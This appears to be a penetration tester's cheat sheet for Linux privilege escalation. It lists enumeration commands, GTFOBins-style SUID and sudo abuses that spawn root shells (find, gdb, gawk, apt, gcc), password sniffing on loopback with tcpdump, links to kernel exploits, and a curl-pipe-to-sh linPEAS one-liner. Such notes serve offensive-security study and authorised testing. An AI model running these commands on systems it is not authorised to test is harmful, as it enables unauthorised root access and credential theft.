# Manual Enumeration

```shell
ps aux
ps -aux | grep pass
ls -lah /etc/cron*
crontab -l
sudo crontab -l
dpkg -l
# find writeable folders with current user
find / -writable -type d 2>/dev/null
# find writeable files with current user
find / -writable 2>/dev/null 
cat /etc/fstab
lsblk
lsmod
/sbin/modinfo libata
find / -perm -u=s -type f 2>/dev/null
sudo tcpdump -i lo -A | grep "pass"
```

# User Trails

```shell
env
cat .bashrc
```
# CRON Jobs

The Linux-based job scheduler is known as cron. Scheduled tasks are listed under the
/etc/cron.* directories, where * represents the frequency at which the task will run. For example,
tasks that will be run daily can be found under /etc/cron.daily. Each script is listed in its own
sub-directory.

```shell
ls -lah /etc/cron*
```

It is worth noting that system administrators often add their own scheduled tasks in the
/etc/crontab file. These tasks should be inspected carefully for insecure file permissions, since
most jobs in this particular file will run as root. To view the current user’s scheduled jobs, we can
run crontab followed by the -l parameter.

```shell
crontab -l
```

# Abusing Password Authentication

# Command Abused Binaries

We can use the [GTFOBins](https://gtfobins.github.io/gtfobins/) to read existent exploitation for binaries in Linux. Below more examples.

## SETUID

#### find

find utils can be abused and can execute a shell. We use `-p` to preventing the effective user from being reset.

```shell
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
```

#### gdb

```shell
/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
```

#### cp

```shell
LFILE=file_to_change
/usr/bin/cp --attributes-only --preserve=all ./cp "$LFILE"
```

#### gawk

```shell
/usr/bin/gawk 'BEGIN {system("/bin/sh")}'
```

# Cabapilities

To get all capabilities on file in the system we can use the following commands, also grepping for a specific capability.

```shell
/usr/sbin/getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null | grep -i setuid
```

# Abusing SUDO

In the file `/etc/sudoers` the sysadmin can specify which commands the users can run with the "sudo" keyword that can be used to run the command with elevated privileges. This could led to a many exploit tecniques that we can find referring to GTFObins. Normally users that can run "sudo" are the users listed in the `sudo group`.

#### apt

```shell
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

#### gcc

```shell
sudo gcc -wrapper /bin/sh,-s .
```

# Kernel Exploits

There are many exploits for many Linux kernel versions out there. We can check the OS Version with cat /etc/os-release. Famous examples of Linux kernel exploits are [DirtyCow](https://dirtycow.ninja/) or [DirtyPipe](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits). There is also a recent exploit on the GNU C Library [Looney Tunables](https://github.com/hadrian3689/looney-tunables-CVE-2023-4911) that can work on newer systems as a privilege escalation. An interesting and recent case is the Pkexec Local Privilege Escalation exploit that can be run with [PwnKit](https://github.com/ly4k/PwnKit). Many of this exploits can be found directly with `searchsploit`.

## linPEAS oneliner

```shell
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```